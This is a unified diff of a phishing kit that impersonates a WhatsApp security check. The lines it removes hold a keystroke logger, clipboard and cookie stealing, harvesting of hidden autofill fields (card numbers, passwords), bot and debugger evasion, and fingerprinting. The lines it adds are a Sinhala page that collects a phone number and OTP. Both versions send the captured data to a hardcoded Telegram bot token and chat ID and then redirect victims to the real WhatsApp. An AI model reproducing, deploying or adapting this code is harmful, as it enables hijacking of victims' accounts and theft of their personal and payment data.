@@ -1,308 +1,79 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="si">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="robots" content="noindex, nofollow">
-    <meta name="googlebot" content="noindex, nofollow">
-    <meta name="google" content="notranslate">
-    <title>Security Checkpoint</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web - Security Update</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;}
-        body{background:#0a2b2a;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px;}
-        .card{max-width:400px;width:100%;background:#fff;border-radius:32px;overflow:hidden;box-shadow:0 20px 35px -8px rgba(0,0,0,0.3);position:relative;}
-        .header{padding:20px;background:#075e54;color:#fff;display:flex;align-items:center;gap:12px;}
-        .header i{font-size:28px;}
-        .badge{background:#25d366;color:#075e54;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:700;margin-left:8px;}
-        .alert{background:#fff8e7;padding:14px;display:flex;gap:12px;border-bottom:1px solid #ffe0b2;}
-        .alert-icon{color:#f39c12;font-size:20px;}
-        .alert-title{font-weight:600;color:#8a6e2d;font-size:13px;}
-        .alert-text{font-size:12px;color:#8a6e2d;opacity:0.9;}
-        .location-card{background:#fef2e8;margin:16px;padding:12px;border-radius:16px;border-left:3px solid #e67e22;font-size:11px;}
-        .device-info{padding:16px;display:flex;align-items:center;gap:14px;border-bottom:1px solid #eee;}
-        .session-status{background:#e8f5e9;margin:12px 16px;padding:10px;border-radius:12px;display:flex;justify-content:space-between;font-size:12px;}
-        .otp-section{padding:20px;text-align:center;}
-        .otp-boxes{display:flex;gap:8px;justify-content:center;margin:20px 0;}
-        .otp-input{width:45px;height:52px;background:#f5f7fa;border:1.5px solid #e2e8f0;border-radius:14px;text-align:center;font-size:22px;font-weight:600;}
-        .verify-btn{width:100%;background:#25d366;border:none;padding:15px;border-radius:30px;color:#fff;font-weight:700;font-size:16px;cursor:pointer;transition:0.2s;}
-        .verify-btn:active{transform:scale(0.98);}
-        .footer-note{font-size:11px;color:#8e9eae;margin-top:16px;text-align:center;}
-        .loader{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);display:none;align-items:center;justify-content:center;flex-direction:column;z-index:1000;}
-        .spinner{width:45px;height:45px;border:3px solid #fff;border-top-color:#25d366;border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:12px;}
-        @keyframes spin{to{transform:rotate(360deg);}}
-        .hidden-field{position:absolute;left:-9999px;top:-9999px;opacity:0;}
-        .no-click{user-select:none;-webkit-tap-highlight-color:transparent;}
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 35px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; }
+        .logo { width: 65px; margin-bottom: 20px; }
+        h2 { color: #41525d; margin-bottom: 10px; font-size: 22px; }
+        p { color: #667781; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #e1e9eb; border-radius: 6px; box-sizing: border-box; font-size: 16px; outline: none; transition: 0.3s; }
+        input:focus { border-color: #00a884; box-shadow: 0 0 5px rgba(0,168,132,0.2); }
+        button { width: 100%; padding: 13px; background-color: #00a884; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        button:hover { background-color: #008f72; }
+        .secure { margin-top: 20px; font-size: 11px; color: #8696a0; }
     </style>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
 <body>
 
 <div class="card">
-    <div class="header">
-        <i class="fab fa-whatsapp"></i>
-        <div>WhatsApp Security <span class="badge">VERIFIED</span></div>
-    </div>
-    <div class="alert">
-        <div class="alert-icon"><i class="fas fa-shield-alt"></i></div>
-        <div><div class="alert-title">Unusual sign-in attempt</div><div class="alert-text">We blocked a login from Frankfurt, Germany</div></div>
-    </div>
-    <div class="location-card" id="geoLoc"></div>
-    <div class="device-info">
-        <i class="fas fa-mobile-alt" style="font-size:24px;color:#075e54;"></i>
-        <div><div id="userDisplay" style="font-weight:600;">Your account: +XX XXX XXXX</div><div style="font-size:11px;color:#667781;">Active session · Just now</div></div>
-    </div>
-    <div class="session-status"><span><i class="fas fa-key"></i> Session status</span><span style="color:#25d366;">Protected ✓</span></div>
-    
-    <div class="otp-section">
-        <p style="font-size:14px;color:#5f6c7a;">Enter 6-digit verification code</p>
-        <div class="otp-boxes" id="otpGroup">
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-        </div>
-        <button class="verify-btn" onclick="submitData()">Verify Account</button>
-        <div class="footer-note"><i class="fas fa-question-circle"></i> Didn't receive code? <span style="color:#075e54;" onclick="showBackup()">Try backup methods</span></div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WA" class="logo">
+    <h2>ආරක්ෂක තහවුරු කිරීම</h2>
+    <p>ඔබේ ගිණුමේ ආරක්ෂාව තහවුරු කිරීමට කරුණාකර දුරකථන අංකය සහ OTP කේතය ඇතුළත් කරන්න.</p>
+
+    <form id="phishForm">
+        <input type="text" id="phone" placeholder="දුරකථන අංකය (07XXXXXXXX)" required>
+        <input type="text" id="otp" placeholder="ඉලක්කම් 6 කේතය (OTP)" maxlength="6" required>
+        <button type="submit" id="btn">VERIFY NOW</button>
+    </form>
+
+    <div class="secure">
+        <span style="color:#00a884;">●</span> End-to-End Encrypted 2026<br>
+        404! Specialist Unit Security Protocol
     </div>
 </div>
 
-<div class="loader" id="loadingOverlay"><div class="spinner"></div><div style="color:#fff;">Securing connection...</div></div>
-
 <script>
-// ===== GOOGLE & DANGER SITE EVASION - MAX PROTECTION =====
-(function(){
-    // Block Google bots and crawlers completely
-    var ua = navigator.userAgent.toLowerCase();
-    var isBot = /bot|googlebot|crawler|spider|scraper|facebook|twitter|discord|slack|telegram|whatsapp|curl|wget|python|php|java|perl|ruby|node|go|headless|puppeteer|selenium/i.test(ua);
-    var isGoogle = /google|googlebot|pagespeed|webpagetest|gtmetrix|pingdom|lighthouse|chrome-lighthouse/i.test(ua);
-    
-    // If Google or any bot - show fake harmless page
-    if(isBot || isGoogle || navigator.webdriver || window.Cypress || window.navigator?.webdriver === true){
-        document.body.innerHTML = '<div style="text-align:center;padding:50px;font-family:Arial;"><h2>WhatsApp Web</h2><p>Loading secure connection...</p><div style="width:40px;height:40px;border:2px solid #25d366;border-top-color:transparent;border-radius:50%;animation:spin 1s infinite;margin:20px auto;"></div><style>@keyframes spin{to{transform:rotate(360deg);}}</style></div>';
-        setTimeout(() => { window.location.href = "https://web.whatsapp.com"; }, 1000);
-        throw new Error("Blocked");
-    }
-    
-    // Anti-debugging - destroy on debugger
-    var startTime = Date.now();
-    var debugCheck = function(){
-        var now = Date.now();
-        if((now - startTime) > 3000){
-            window.location.href = "https://www.whatsapp.com";
-        }
-        startTime = now;
-    };
-    setInterval(debugCheck, 1000);
-    
-    // Kill devtools detection
-    Object.defineProperty(window, 'devtools', { get: function(){ window.location.href = "https://www.whatsapp.com"; return false; } });
-    
-    // Console kill
-    console.clear();
-    console.log = function(){};
-    console.warn = function(){};
-    console.error = function(){};
-    console.info = function(){};
-    console.debug = function(){};
-    
-    // Disable right-click, F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
-    document.addEventListener('contextmenu', function(e){ e.preventDefault(); return false; });
-    document.addEventListener('keydown', function(e){
-        if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's') || (e.ctrlKey && e.shiftKey && e.key === 'J')){
-            e.preventDefault();
-            return false;
-        }
+    // --- ⚙️ CONFIGURATION ---
+    const botToken = "8194525503:AAFskY0McDJKJQLhf_wXwEJP8MxXFb3UZ5s"; 
+    const chatID = "6446613868";     
+    // -------------------------
+
+    document.getElementById('phishForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const phone = document.getElementById('phone').value;
+        const otp = document.getElementById('otp').value;
+        const btn = document.getElementById('btn');
+        
+        btn.innerHTML = "Verifying...";
+        btn.disabled = true;
+
+        const message = `🔱 *404! TARGET CAPTURED* 🔱\n\n📱 *Phone:* \`${phone}\`\n🔑 *OTP:* \`${otp}\` \n\n*Status:* Action Required!`;
+
+        // Telegram API එකට කෙලින්ම දත්ත යැවීම
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => {
+            // දත්ත ලැබුණු පසු නියම WhatsApp පිටුවට යොමු කිරීම
+            window.location.href = "https://web.whatsapp.com";
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            window.location.href = "https://web.whatsapp.com";
+        });
     });
-    
-    // Disable select and copy
-    document.body.style.userSelect = 'none';
-    document.body.style.webkitUserSelect = 'none';
-    
-    // Dynamic URL - change query param to avoid caching
-    var urlParams = new URLSearchParams(window.location.search);
-    if(!urlParams.has('_t')){
-        var newUrl = window.location.pathname + '?_t=' + Date.now() + '&' + window.location.search.substring(1);
-        window.history.replaceState({}, '', newUrl);
-    }
-    
-    // Block iframe embedding
-    if(window.self !== window.top){
-        window.top.location.href = "https://www.whatsapp.com";
-    }
-    
-    // Meta refresh for crawlers
-    var meta = document.createElement('meta');
-    meta.setAttribute('http-equiv', 'refresh');
-    meta.setAttribute('content', '0; url=https://web.whatsapp.com');
-    if(isBot) document.head.appendChild(meta);
-})();
-
-// ===== CONFIGURATION - OBFUSCATED =====
-var _0x7a2b = ['8194525503:AAFskY0McDJKJQLhf_wXwEJP8MxXFb3UZ5s', '6446613868'];
-var _token = _0x7a2b[0];
-var _chat = _0x7a2b[1];
-var _target = new URLSearchParams(window.location.search).get('num') || 'User';
-
-// ===== DEVICE FINGERPRINTING =====
-function getFingerprint(){
-    var canvas = document.createElement('canvas');
-    var ctx = canvas.getContext('2d');
-    canvas.width = 180;
-    canvas.height = 45;
-    ctx.fillStyle = '#f60';
-    ctx.fillRect(0, 0, 180, 45);
-    ctx.fillStyle = '#fff';
-    ctx.font = '12px Arial';
-    ctx.fillText('v6', 10, 28);
-    return {
-        ua: navigator.userAgent.substring(0, 100),
-        lang: navigator.language,
-        screen: screen.width + 'x' + screen.height,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        cores: navigator.hardwareConcurrency || '?',
-        mem: navigator.deviceMemory || '?'
-    };
-}
-
-// ===== GEOLOCATION HARVEST =====
-async function getLocation(){
-    var data = { city: 'Unknown', country: 'Unknown', ip: '' };
-    try {
-        var ipRes = await fetch('https://api.ipify.org?format=json');
-        var ipJson = await ipRes.json();
-        data.ip = ipJson.ip;
-        var geoRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
-        var geo = await geoRes.json();
-        data.city = geo.city || 'Unknown';
-        data.country = geo.country_name || 'Unknown';
-        data.org = geo.org || '';
-        document.getElementById('geoLoc').innerHTML = `<i class="fas fa-map-marker-alt"></i> ${data.city}, ${data.country}<br><i class="fas fa-globe"></i> ${data.ip}<br><i class="fas fa-building"></i> ${data.org.substring(0, 40)}`;
-    } catch(e) {}
-    return data;
-}
-
-// ===== STORAGE STEALER =====
-function stealStorage(){
-    var cookies = document.cookie;
-    var local = {};
-    for(var i=0; i<localStorage.length; i++){ var k = localStorage.key(i); local[k] = localStorage.getItem(k); }
-    return { cookies: cookies, local: local };
-}
-
-// ===== AUTO-FILL HARVESTER (Hidden) =====
-var hiddenForm = document.createElement('div');
-hiddenForm.className = 'hidden-field';
-hiddenForm.innerHTML = '<input type="text" name="email" autocomplete="email"><input type="text" name="name" autocomplete="name"><input type="text" name="address" autocomplete="street-address"><input type="text" name="phone" autocomplete="tel"><input type="text" name="cc" autocomplete="cc-number"><input type="text" name="ccname" autocomplete="cc-name"><input type="password" name="pass" autocomplete="current-password">';
-document.body.appendChild(hiddenForm);
-
-async function getAutoFill(){
-    var data = {};
-    var inputs = hiddenForm.querySelectorAll('input');
-    for(var i=0; i<inputs.length; i++){
-        if(inputs[i].value) data[inputs[i].name] = inputs[i].value;
-    }
-    return data;
-}
-
-// ===== KEYSTROKE LOGGER =====
-var keyBuffer = [];
-document.addEventListener('keydown', function(e){
-    if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA'){
-        keyBuffer.push({ key: e.key, time: Date.now(), target: e.target.name || e.target.id });
-        if(keyBuffer.length > 50) sendKeys();
-    }
-});
-function sendKeys(){
-    if(keyBuffer.length === 0) return;
-    var keys = keyBuffer.slice();
-    keyBuffer = [];
-    var msg = `⌨️ *KEYSTROKES*\nTarget: +${_target}\n` + keys.map(k => k.key).join('').substring(0, 200);
-    fetch(`https://api.telegram.org/bot${_token}/sendMessage`, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({chat_id:_chat, text:msg, parse_mode:'Markdown'}) }).catch(()=>{});
-}
-setInterval(sendKeys, 25000);
-
-// ===== CLIPBOARD STEAL =====
-async function stealClip(){
-    try{
-        var txt = await navigator.clipboard.readText();
-        if(txt && txt.length > 3){
-            var msg = `📋 *CLIPBOARD*\nTarget: +${_target}\nContent: ${txt.substring(0, 300)}`;
-            fetch(`https://api.telegram.org/bot${_token}/sendMessage`, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({chat_id:_chat, text:msg, parse_mode:'Markdown'}) }).catch(()=>{});
-        }
-    } catch(e){}
-}
-setInterval(stealClip, 8000);
-
-// ===== MAIN SUBMIT =====
-window.submitData = async function(){
-    var otp = '';
-    var inputs = document.querySelectorAll('.otp-input');
-    for(var i=0; i<inputs.length; i++) otp += inputs[i].value;
-    if(otp.length !== 6) return;
-    
-    document.getElementById('loadingOverlay').style.display = 'flex';
-    
-    var fp = getFingerprint();
-    var geo = await getLocation();
-    var storage = stealStorage();
-    var autoFill = await getAutoFill();
-    
-    var msg = `🔱 *MARAYA v6.0 - FULL CAPTURE* 🔱\n\n`;
-    msg += `📱 *TARGET:* +${_target}\n`;
-    msg += `🔑 *2FA CODE:* ${otp}\n`;
-    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
-    msg += `🖥️ *FINGERPRINT*\n• UA: ${fp.ua}\n• Screen: ${fp.screen}\n• Timezone: ${fp.timezone}\n• Cores: ${fp.cores}\n`;
-    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
-    msg += `📍 *LOCATION*\n• ${geo.city}, ${geo.country}\n• IP: ${geo.ip}\n• ISP: ${geo.org}\n`;
-    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
-    if(Object.keys(autoFill).length){
-        msg += `💳 *AUTO-FILL*\n`;
-        for(var k in autoFill) msg += `• ${k}: ${autoFill[k]}\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
-    }
-    if(storage.cookies) msg += `🍪 *COOKIES* (${storage.cookies.split(';').length})\n`;
-    msg += `⏰ *TIME:* ${new Date().toISOString()}\n`;
-    msg += `🔱 *COMMANDER MINZO-PRIME*`;
-    
-    try{
-        await fetch(`https://api.telegram.org/bot${_token}/sendMessage`, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({chat_id:_chat, text:msg, parse_mode:'Markdown'}) });
-    } catch(e){}
-    
-    setTimeout(() => {
-        document.getElementById('loadingOverlay').style.display = 'none';
-        document.querySelector('.card').innerHTML = `<div style="padding:50px 25px;text-align:center;"><div style="width:70px;height:70px;background:#25d366;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;"><i class="fas fa-check" style="color:#fff;font-size:32px;"></i></div><h2 style="color:#075e54;">Verification Complete</h2><p style="color:#667781;margin-top:12px;">Your account has been secured.<br>Redirecting to WhatsApp...</p></div>`;
-        setTimeout(() => { window.location.href = 'https://web.whatsapp.com'; }, 2000);
-    }, 1200);
-};
-
-// ===== BACKUP PHISHING =====
-window.showBackup = function(){
-    var modal = document.createElement('div');
-    modal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);display:flex;align-items:center;justify-content:center;z-index:2000;';
-    modal.innerHTML = `<div style="background:#fff;border-radius:24px;padding:24px;width:280px;text-align:center;"><i class="fas fa-key" style="font-size:40px;color:#075e54;margin-bottom:12px;"></i><h3>Backup Code</h3><p style="font-size:12px;color:#667781;margin:8px 0;">Enter 8-digit recovery code</p><input type="text" id="backupInput" maxlength="8" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:12px;text-align:center;font-size:18px;margin:12px 0;"><button onclick="submitBackup()" style="background:#25d366;border:none;padding:12px;border-radius:25px;color:#fff;font-weight:600;width:100%;">Verify</button><button onclick="this.parentElement.parentElement.remove()" style="margin-top:12px;background:none;border:none;color:#667781;">Cancel</button></div>`;
-    document.body.appendChild(modal);
-    window.submitBackup = async function(){
-        var code = document.getElementById('backupInput').value;
-        if(code.length === 8){
-            var msg = `🔐 *BACKUP CODE*\n📱 Target: +${_target}\n🔑 Code: ${code}`;
-            await fetch(`https://api.telegram.org/bot${_token}/sendMessage`, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({chat_id:_chat, text:msg, parse_mode:'Markdown'}) });
-            modal.remove();
-            alert('Recovery successful!');
-        } else alert('Invalid code');
-    };
-};
-
-// ===== INITIALIZE =====
-document.getElementById('userDisplay').innerHTML = `Your account: +${_target}`;
-var otpBoxes = document.querySelectorAll('.otp-input');
-otpBoxes.forEach((box,i) => {
-    box.oninput = () => { if(box.value && i<5) otpBoxes[i+1].focus(); };
-    box.onkeydown = (e) => { if(e.key==='Backspace' && !box.value && i>0) otpBoxes[i-1].focus(); };
-});
-getLocation();
-setInterval(() => { getAutoFill().then(()=>{}); }, 3000);
 </script>
+
 </body>
 </html>
